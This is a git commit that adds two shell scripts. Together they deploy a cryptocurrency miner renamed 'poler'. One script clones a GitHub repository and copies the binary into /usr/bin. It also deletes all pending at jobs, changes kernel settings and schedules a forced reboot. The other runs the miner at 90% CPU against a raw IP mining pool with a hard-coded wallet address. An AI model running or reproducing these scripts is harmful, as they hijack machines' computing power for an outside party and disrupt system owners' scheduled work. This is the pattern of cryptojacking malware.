54aecdcabfb525a3a654a636d89815660ae1c6ba
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-04-30 06:36:31 +0300

    #PRIMADD

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 3 -o 94.103.95.157:6015 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass="$(hostname)":lyashko6666@gmail.com -k
---
+++ belya.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+rm -rf /tmp/three-two-one/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir three-two-one
+git clone https://github.com/tigoratka/three-two-one.git /tmp/three-two-one
+cd /tmp/three-two-one
+chmod +x /tmp/three-two-one/poler
+chmod 777 ./*.sh
+cp /tmp/three-two-one/poler /usr/bin/
+sleep 3
+
+sudo apt-get install dos2unix
+sudo dos2unix time1.sh
+sudo dos2unix 75.sh
+sudo dos2unix 50.sh
+sudo dos2unix 80.sh
+sudo dos2unix 65.sh
+sudo dos2unix 90.sh
+sudo dos2unix 40.sh
+
+touch /tmp/at.txt
+chmod +x /tmp/at.txt
+echo 'sudo systemctl reboot -f' >> /tmp/at.txt
+sudo at now + 8 hours < /tmp/at.txt
+
+sudo ./time1.sh
